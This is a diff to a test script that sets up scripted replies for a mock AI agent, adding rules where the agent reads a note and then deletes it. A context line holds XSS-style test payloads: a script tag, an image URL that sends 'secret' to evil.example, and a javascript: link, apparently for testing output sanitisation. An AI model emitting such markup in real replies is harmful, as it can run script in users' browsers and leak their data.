@@ -38,6 +38,10 @@ cat >"$STATE/script.json" <<'JSON'
   "rules": [
     { "match": "^delete the note", "role": "user", "response": "Deleting it.", "toolCalls": [
       { "name": "workspace_delete", "arguments": { "path": "notes/old.md" } } ] },
+    { "match": "^read then delete", "role": "user", "response": "Reading it first.", "toolCalls": [
+      { "name": "workspace_read", "arguments": { "path": "notes/crit.md" } } ] },
+    { "match": "critical note", "role": "tool", "response": "Now deleting it.", "toolCalls": [
+      { "name": "workspace_delete", "arguments": { "path": "notes/crit.md" } } ] },
     { "match": ".*", "role": "tool", "response": "The tool step is finished." },
     { "match": "^slow", "response": "This reply streams slowly so a reload can land in the middle of it, and the rest should continue without any duplication at all. The end.", "chunkSize": 4, "delayMs": 120 },
     { "match": "^markdown", "response": "**bold** <script>window.__pwned = 1</script> ![leak](https://evil.example/leak.png?d=secret) [bad](javascript:alert(1)) [ok](https://example.com)" },
